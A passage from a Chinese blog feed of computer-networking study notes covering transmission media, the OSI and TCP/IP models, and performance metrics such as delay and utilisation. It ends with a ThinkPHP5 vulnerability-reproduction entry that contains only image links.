<h3 id="导向传输介质"><a href="#导向传输介质" class="headerlink" title="导向传输介质"></a>导向传输介质</h3><h4 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h4><p>两根采用一定规则并排绞合的、相互绝缘的铜导线组成<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103204758526-167279265123552.png" alt><br>绞合可以减少对相邻导线的电磁干扰。<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103205007478-167279265309853.png" alt></p>
<h4 id="同轴电缆"><a href="#同轴电缆" class="headerlink" title="同轴电缆"></a>同轴电缆</h4><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103205047225-167279265478454.png" alt></p>
<h4 id="光纤"><a href="#光纤" class="headerlink" title="光纤"></a>光纤</h4><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103205458461-167279265652955.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103205636018-167279265813256.png" alt></p>
<h3 id="非导向性传输介质"><a href="#非导向性传输介质" class="headerlink" title="非导向性传输介质"></a>非导向性传输介质</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103210133968-167279265980857.png" alt><br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103210940343-167279266092058.png" alt><br>红外线、激光：把要传输的信号分别转换为各自的信号格式，即红外光信号和激光信号，再在空间中传播。信号固定方向传播。</p>
<h2 id="物理层设备"><a href="#物理层设备" class="headerlink" title="物理层设备"></a>物理层设备</h2><h3 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103211523981-167279266307859.png" alt></p>
<p>中继器的功能：对信号进行再生和还原，对衰减的信号进行放大，保持与源数据相同，以增加信号传输的距离，延长网络长度。’</p>
<p>中继器的两端：两端的网络部分是网段，而不是子网，适用于完全相同的两类网络的互连，且两个网段速率要相同。<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103211756115-167279266471260.png" alt><br>中继器两端的网段一定要是同一个协议。</p>
<p>5-4-3规则：网络标准中都对信号的延迟范围做了具体的规定，因而中继器只能在规定的范围内进行，否则会网络故障</p>
<h3 id="集线器（多口中继器）"><a href="#集线器（多口中继器）" class="headerlink" title="集线器（多口中继器）"></a>集线器（多口中继器）</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103212138463-167279266705861.png" style="zoom:80%;"></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103212118380-167279267072462.png" alt></p>
<p>集线器不能分割冲突域——》连在集线器上的工作主机平分带宽</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计网概念</tag>
      </tags>
  </entry>
  <entry>
    <title>体系结构&amp;参考模型</title>
    <url>/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>OSI参考模型和TCP/IP参考模型</p>
<span id="more"></span>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231141405853-16727927031211.png" alt></p>
<p>对等实体之间才有协议，下层为上层提供服务</p>
<h3 id="分层的基本原则"><a href="#分层的基本原则" class="headerlink" title="分层的基本原则"></a>分层的基本原则</h3><ol>
<li>各层之间相互独立，每层只实现一种相对独立的功能</li>
<li>每层之间界面自然清晰，易于理解，互相交流尽可能少</li>
<li>结构上可分割开。每层都采用最合适的技术来实现</li>
<li>保持下层对上层的对立性，上层单向使用下层提供的服务</li>
<li>整个分层结构应该能促进标准化工作</li>
</ol>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142532860-16727928089353.png" alt></p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142748644-16727927211942.png" style="zoom: 67%;"><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231142709447.png" style="zoom:80%;"></p>
<h2 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结"></a>概念总结</h2><ul>
<li>网络体系结构是从<strong>功能</strong>上描述计算机网络结构</li>
<li>计算机网络体系结构简称网络体系结构是<strong>分层结构</strong></li>
<li>每层遵守某个/些<strong>网络协议</strong>以完成本层功能</li>
<li>计算机网络体系结构是计算机网络的各层及其协议的集合</li>
<li>第n层在向n+1层提供服务时，此服务不仅包含第n层本身的功能，还包含由下层服务提供的功能</li>
<li>仅仅在相邻层间有接口，且所提供的服务的具体实现细节对上一层完全屏蔽（透明）</li>
<li>体系结构是<strong>抽象</strong>的，而实现是指能运行的一些软件和硬件</li>
</ul>
<h1 id="参考模型"><a href="#参考模型" class="headerlink" title="参考模型"></a>参考模型</h1><h3 id="7层OSI参考模型"><a href="#7层OSI参考模型" class="headerlink" title="7层OSI参考模型"></a>7层OSI参考模型</h3><p>目标：支持异构网络系统的互联互通</p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231165655402-16727928342534.png" alt="image-20221231165655402" style="zoom:80%;"></p>
<h3 id="ISO-OSI参考模型解释通信过程"><a href="#ISO-OSI参考模型解释通信过程" class="headerlink" title="ISO/OSI参考模型解释通信过程"></a>ISO/OSI参考模型解释通信过程</h3><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102091707835-16727928362615.png" alt="image-20230102091707835"></p>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>所有能和用户交互产生网络流量的程序（eg：qq，163邮箱）</p>
<h4 id="典型应用层服务："><a href="#典型应用层服务：" class="headerlink" title="典型应用层服务："></a>典型应用层服务：</h4><p>文件传输(FTP)，电子邮件(SMTP)，万维网(HTTP)</p>
<h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>用于处理在两个通信系统中交换信息的表示方式（语法和语义）</p>
<p>功能一：数据格式变换<br>功能二：数据加密解密<br>功能三：数据压缩和恢复</p>
<h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>向表示层实体/用户进程提供建立连接并在连接上有序的传输数据。<br>这是绘画，也是<strong>建立同步</strong>（SYN）</p>
<p>功能一：建立、管理、终止会话<br>功能二：使用校验点可使会话在通信失效时从校验点/同步点继续回复通信，实现数据同步。<br>——适用于传输大文件</p>
<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>负责主机中两个进程的通信，即端到端的通信。传输单位是报文段或用户数据报。</p>
<p>功能一：可靠传输、不可靠传输<br>功能二：差错控制<br>功能三：流量控制<br>功能四：复用分用</p>
<p>主要协议：TCP，UDP</p>
<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。网络层成本传输单位是数据报</p>
<p>功能一：路由选择<br>功能二：流量控制<br>功能三：差错控制<br>功能四：拥塞控制</p>
<p>主要协议：IP、IPX、ICMP</p>
<h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>主要任务是把网络层传下来的数据报组装成帧。<br>数据链路层的传输单位是帧</p>
<p>功能一：成帧（定义帧的开始和结束）<br>功能二：差错控制<br>功能三：流量控制<br>功能四：访问（接入）控制：控制对信道的访问</p>
<p>主要协议：PPP</p>
<h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>主要任务是在物理媒体上实现比特流的透明传输<br>物理层传输单位是比特</p>
<p>透明传输：指不管所传数据是什么样的比特组合，都应当能够在链路上传送</p>
<p>功能一：定义接口特性<br>功能二：定义传输模式（单工、半双工、双工）<br>功能三：定义传输速率<br>功能四：比特同步<br>功能五：比特编码</p>
<p>主要协议：Rj45、802.3</p>
<h2 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP/IP参考模型"></a>TCP/IP参考模型</h2><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102153143474-16727928405746.png" alt="image-20230102153143474"></p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102153652377-16727928423557.png" alt="image-20230102153652377"></p>
<h2 id="5层参考模型"><a href="#5层参考模型" class="headerlink" title="5层参考模型"></a>5层参考模型</h2><p>应用层：支持各种网络应用————FTP、SMTP、HTTP<br>传输层：进程-进程的数据传输————TCP、UDP<br>网络层：源主机到目的主机的数据分组路由与转发————IP、ICMP、OSPF<br>数据链路层：把网络层传下来的数据报组装成帧————Ethernet、PPP<br>物理层：比特传输</p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102154506552-16727928450328.png" alt="image-20230102154506552"></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计网概念</tag>
      </tags>
  </entry>
  <entry>
    <title>体系结构&amp;参考模型</title>
    <url>/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&amp;%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>OSI参考模型和TCP/IP参考模型</p>
<span id="more"></span>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20221231141405853-16727927031211.png" alt></p>
<p>对等实体之间才有协议，下层为上层提供服务</p>
<h3 id="分层的基本原则"><a href="#分层的基本原则" class="headerlink" title="分层的基本原则"></a>分层的基本原则</h3><ol>
<li>各层之间相互独立，每层只实现一种相对独立的功能</li>
<li>每层之间界面自然清晰，易于理解，互相交流尽可能少</li>
<li>结构上可分割开。每层都采用最合适的技术来实现</li>
<li>保持下层对上层的对立性，上层单向使用下层提供的服务</li>
<li>整个分层结构应该能促进标准化工作</li>
</ol>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20221231142532860-16727928089353.png" alt></p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20221231142748644-16727927211942.png" style="zoom: 67%;"><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20221231142709447.png" style="zoom:80%;"></p>
<h2 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结"></a>概念总结</h2><ul>
<li>网络体系结构是从<strong>功能</strong>上描述计算机网络结构</li>
<li>计算机网络体系结构简称网络体系结构是<strong>分层结构</strong></li>
<li>每层遵守某个/些<strong>网络协议</strong>以完成本层功能</li>
<li>计算机网络体系结构是计算机网络的各层及其协议的集合</li>
<li>第n层在向n+1层提供服务时，此服务不仅包含第n层本身的功能，还包含由下层服务提供的功能</li>
<li>仅仅在相邻层间有接口，且所提供的服务的具体实现细节对上一层完全屏蔽（透明）</li>
<li>体系结构是<strong>抽象</strong>的，而实现是指能运行的一些软件和硬件</li>
</ul>
<h1 id="参考模型"><a href="#参考模型" class="headerlink" title="参考模型"></a>参考模型</h1><h3 id="7层OSI参考模型"><a href="#7层OSI参考模型" class="headerlink" title="7层OSI参考模型"></a>7层OSI参考模型</h3><p>目标：支持异构网络系统的互联互通</p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20221231165655402-16727928342534.png" alt="image-20221231165655402" style="zoom:80%;"></p>
<h3 id="ISO-OSI参考模型解释通信过程"><a href="#ISO-OSI参考模型解释通信过程" class="headerlink" title="ISO/OSI参考模型解释通信过程"></a>ISO/OSI参考模型解释通信过程</h3><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20230102091707835-16727928362615.png" alt="image-20230102091707835"></p>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>所有能和用户交互产生网络流量的程序（eg：qq，163邮箱）</p>
<h4 id="典型应用层服务："><a href="#典型应用层服务：" class="headerlink" title="典型应用层服务："></a>典型应用层服务：</h4><p>文件传输(FTP)，电子邮件(SMTP)，万维网(HTTP)</p>
<h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>用于处理在两个通信系统中交换信息的表示方式（语法和语义）</p>
<p>功能一：数据格式变换<br>功能二：数据加密解密<br>功能三：数据压缩和恢复</p>
<h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>向表示层实体/用户进程提供建立连接并在连接上有序的传输数据。<br>这是绘画，也是<strong>建立同步</strong>（SYN）</p>
<p>功能一：建立、管理、终止会话<br>功能二：使用校验点可使会话在通信失效时从校验点/同步点继续回复通信，实现数据同步。<br>——适用于传输大文件</p>
<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>负责主机中两个进程的通信，即端到端的通信。传输单位是报文段或用户数据报。</p>
<p>功能一：可靠传输、不可靠传输<br>功能二：差错控制<br>功能三：流量控制<br>功能四：复用分用</p>
<p>主要协议：TCP，UDP</p>
<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。网络层成本传输单位是数据报</p>
<p>功能一：路由选择<br>功能二：流量控制<br>功能三：差错控制<br>功能四：拥塞控制</p>
<p>主要协议：IP、IPX、ICMP</p>
<h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>主要任务是把网络层传下来的数据报组装成帧。<br>数据链路层的传输单位是帧</p>
<p>功能一：成帧（定义帧的开始和结束）<br>功能二：差错控制<br>功能三：流量控制<br>功能四：访问（接入）控制：控制对信道的访问</p>
<p>主要协议：PPP</p>
<h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>主要任务是在物理媒体上实现比特流的透明传输<br>物理层传输单位是比特</p>
<p>透明传输：指不管所传数据是什么样的比特组合，都应当能够在链路上传送</p>
<p>功能一：定义接口特性<br>功能二：定义传输模式（单工、半双工、双工）<br>功能三：定义传输速率<br>功能四：比特同步<br>功能五：比特编码</p>
<p>主要协议：Rj45、802.3</p>
<h2 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP/IP参考模型"></a>TCP/IP参考模型</h2><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20230102153143474-16727928405746.png" alt="image-20230102153143474"></p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20230102153652377-16727928423557.png" alt="image-20230102153652377"></p>
<h2 id="5层参考模型"><a href="#5层参考模型" class="headerlink" title="5层参考模型"></a>5层参考模型</h2><p>应用层：支持各种网络应用————FTP、SMTP、HTTP<br>传输层：进程-进程的数据传输————TCP、UDP<br>网络层：源主机到目的主机的数据分组路由与转发————IP、ICMP、OSPF<br>数据链路层：把网络层传下来的数据报组装成帧————Ethernet、PPP<br>物理层：比特传输</p>
<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/image-20230102154506552-16727928450328.png" alt="image-20230102154506552"></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计网概念</tag>
      </tags>
  </entry>
  <entry>
    <title>性能指标</title>
    <url>/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>速率、带宽、吞吐量、时延、时延带宽积、往返时延RTT、利用率</p>
<span id="more"></span>
<h3 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h3><p>速率即<strong>数据率</strong>或称<strong>数据传输率</strong>或<strong>比特率</strong><br><img src="/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20221231100931394-16727929048181.png" alt="image-20221231100931394"></p>
<p><img src="/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20221231101133151-16727929066852.png" alt="image-20221231101133151"></p>
<h3 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h3><p>表示网络的通信线路传送数据的能力，通常是指单位时间内从网络中的某一点到另一点所能通过的<strong>“最高数据率”</strong>。单位是“比特每秒”，b/s，kb/s，Mb/s，Gb/s</p>
<h3 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h3><p>表示单位时间内通过某个网络（或信道、接口）的数据率，单位b/s，kb/s，Mb/s等<br>吞吐量受网络的带宽或网络的额定速率的限制S</p>
<p><img src="/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20221231103536362-16727929083683.png" alt="image-20221231103536362"></p>
<h3 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h3><p>指数据（报文/分组/比特流）从网络（或链路）的一段传送到另一端所需的时间。也叫延迟或者迟延，单位是s。</p>
<h4 id="发送时延"><a href="#发送时延" class="headerlink" title="发送时延"></a>发送时延</h4><script type="math/tex; mode=display">
发送时延=\frac{数据长度}{信道带宽(发送速率)}</script><p>高速链路指提高发送速率</p>
<h4 id="传播时延"><a href="#传播时延" class="headerlink" title="传播时延"></a>传播时延</h4><p>却决于电磁波传播速度和链路长度</p>
<script type="math/tex; mode=display">
传播时延=\frac{信道长度}{电磁波在信道上的传播速率}</script><h4 id="排队时延"><a href="#排队时延" class="headerlink" title="排队时延"></a>排队时延</h4><p>等待输出/入，链路可用</p>
<h4 id="处理时延"><a href="#处理时延" class="headerlink" title="处理时延"></a>处理时延</h4><p>检错，找出口</p>
<h3 id="时延带宽积"><a href="#时延带宽积" class="headerlink" title="时延带宽积"></a>时延带宽积</h3><p>时延带宽积=传播时延×带宽，单位是bit</p>
<h3 id="往返时延RTT"><a href="#往返时延RTT" class="headerlink" title="往返时延RTT"></a>往返时延RTT</h3><p>从发送方发送数据开始，到发送方收到接收方的确认，总共经历的时延</p>
<p><img src="/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20221231134859185-16727929121454.png" alt="image-20221231134859185"></p>
<p>RTT越大，在收到确认之前，可以发送的数据越多</p>
<script type="math/tex; mode=display">
RTT包括\begin{cases}往返传播时延=传播时延*2\\末端处理时间\end{cases}</script><h3 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h3><h4 id="信道利用率"><a href="#信道利用率" class="headerlink" title="信道利用率"></a>信道利用率</h4><p>$信道利用率=\frac{有数据通过时间}{(有+无)数据通过时间}$</p>
<h4 id="网络利用率"><a href="#网络利用率" class="headerlink" title="网络利用率"></a>网络利用率</h4><p>信道利用率加权平均值</p>
<p><img src="/2022/12/31/%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/image-20221231140430417-16727929147615.png" alt="image-20221231140430417"></p>
<p>eg：假定网络利用率达到了80%，则估算现在的网络时延是最小值的___？<br>利用率有信道利用率和网络利用率两种。信道利用率指出某信道有百分之几百的时间是被利用的（有数据通过）。完全空闲的信道的利用率是零。网络利用率则是全网络的信道利用率的加权平均值。信道利用率并非越高越好。这是因为，根据排队的理论，当某信道的利用率增大时，该信道引起的时延也就迅速增加。当网络的通信量很少时，网络产生的时延并不大。但在网络通信量不断增大的情况下，由于分组在网络结点（路由器或结点交换机）进行处理时需要排队等候，因此网络引起的时延就会增大。如果令D0表示网络空闲时的时延，D表示网络当前的时延，那么适当的假定条件下，可以用下面的简单公式来表示D，D0和利用率U之间的关系:<br>D=D0/(1-U)那么,<br>网络时延最小值就是空闲时为D0;<br>当网络利用率达80%,则D=D0/(1-80%)=D0/0.2=5D0;</p>
<p>所以是最小值的5倍</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计网概念</tag>
      </tags>
  </entry>
  <entry>
    <title>认识计算机网络</title>
    <url>/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>计算机网络的概念，功能，组成，分类</p>
<span id="more"></span>
<p>RTT:往返传播时延      </p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221230185354019-16727929437801.png" alt="image-20221230185354019"></p>
<p>计算机网络：是一个将分散的、具有独立功能的计算机系统，通过通信设备与线路连接起来，由功能完善的软件实现资源共享和信息传递的系统</p>
<p>计算机网络是互连的、自洽的计算机集合<br>互连-通过通信链路互联互通<br>自洽-无主从关系 </p>
<h2 id="计算机网络的功能"><a href="#计算机网络的功能" class="headerlink" title="计算机网络的功能"></a>计算机网络的功能</h2><p>1.数据通信</p>
<p>2.资源共享</p>
<p>3.分布式处理</p>
<p>4.提高可靠性</p>
<p>5.负载均衡</p>
<h3 id="计算机网络的发展"><a href="#计算机网络的发展" class="headerlink" title="计算机网络的发展"></a>计算机网络的发展</h3><h4 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h4><p>ARPAnet 阿帕网<br><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221230194927197-16727929461652.png" alt="image-20221230194927197"></p>
<p> 1983年阿帕网接受TCP/IP选定Internet为主要的计算机通信网络，成立了Internet因特网</p>
<h4 id="第二阶段——三级结构"><a href="#第二阶段——三级结构" class="headerlink" title="第二阶段——三级结构"></a>第二阶段——三级结构</h4><p>1985年，NSF围绕6个大型计算机中心建设计算机网络，即国家科学基金网NSFNET<img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221230195323201-16724012038611-16727929473853.png" alt="image-20221230195323201"></p>
<h4 id="第三阶段——多层次ISP结构"><a href="#第三阶段——多层次ISP结构" class="headerlink" title="第三阶段——多层次ISP结构"></a>第三阶段——多层次ISP结构</h4><p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221230195548440-16727929491234.png" alt="image-20221230195548440"></p>
<p>IXP：因特网交换点——大大提高了信息传递和信息共享的速度</p>
<h2 id="计算机网络的组成"><a href="#计算机网络的组成" class="headerlink" title="计算机网络的组成"></a>计算机网络的组成</h2><p>1.组成部分：硬件、软件、协议<br><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231090329144-16727929510445.png" alt="image-20221231090329144"></p>
<p>2.工作方式</p>
<p>端和端之间的通信是进程之间的交流</p>
<p>边缘部分：用户直接使用<br>————C/S方式(Client/Server)，eg：微信<br>————B/S方式(Brower/Server)<br>————P2P方式(peer-to-peer)， eg：种子下载</p>
<p>核心部分：为边缘部分服务</p>
<p>3.功能组成<br>——通信子网：实现数据通信<br>——资源子网：实现资源共享/数据处理</p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231091641824-16727929530996.png" alt="image-20221231091641824"></p>
<h2 id="计算机网络的分类"><a href="#计算机网络的分类" class="headerlink" title="计算机网络的分类"></a>计算机网络的分类</h2><p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231091904682-16727929549897.png" alt="image-20221231091904682"></p>
<p>广域网使用交换技术，局域网使用广播技术</p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231092226561-16727929560428.png" alt="image-20221231092226561"></p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231092249995-16727929573559.png" alt="image-20221231092249995"><br>电路交换：电话<br>报文交换、分组交换：使用存储转发</p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231092654347-167279295892210.png" alt="image-20221231092654347"></p>
<p>网状型常用于广域网</p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231092847098-167279296069711.png" alt="image-20221231092847098"></p>
<h2 id="标准化工作及相关组织"><a href="#标准化工作及相关组织" class="headerlink" title="标准化工作及相关组织"></a>标准化工作及相关组织</h2><p>标准化对计算机网络至关重要</p>
<p><img src="/2022/12/30/%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20221231093324559-167279296217912.png" alt="image-20221231093324559"></p>
<p>标准分类：<br>——法定标准：由权威机构制定的正式的合法的标————OSI<br>——事实标准：某些公司的产品在竞争中占据了主流，逐渐这些产品的协议和技术成为了标准————TCP/IP</p>
<h3 id="RFC-Request-For-Comments-————因特网标准的形式"><a href="#RFC-Request-For-Comments-————因特网标准的形式" class="headerlink" title="RFC(Request For Comments)————因特网标准的形式"></a>RFC(Request For Comments)————因特网标准的形式</h3><p>RFC要上升为因特网正式标准的四个阶段：<br>        1）因特网草案：这个阶段还不是RFC文档<br>        2）建议标准：从这个阶段开始成为RFC文档<br>        3）草案标准：递交IETF\IAB审核（已取消）<br>        4）因特网标准</p>
<h3 id="标准化工作的相关组织"><a href="#标准化工作的相关组织" class="headerlink" title="标准化工作的相关组织"></a>标准化工作的相关组织</h3><p>国际标准化组织ISO：OSI模型、HDLC协议<br>国际电信联盟ITU：制定通信规则<br>电气和电子工程师协会IEEE：学术机构、IEEE802系列标准、5G<br>Internet工程任务组IETF：负责因特网相关标准的制定</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计网概念</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp5漏洞复刻</title>
    <url>/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>对于thinkphp5经典漏洞的复现</p>
<span id="more"></span>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\1.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\2.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\3.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\4.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\5.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\6.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\7.png" alt></p>
<p><img src="/2022/12/30/thinkphp5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E5%88%BB/blog\source\_posts\thinkphp5\8.png" alt></p>
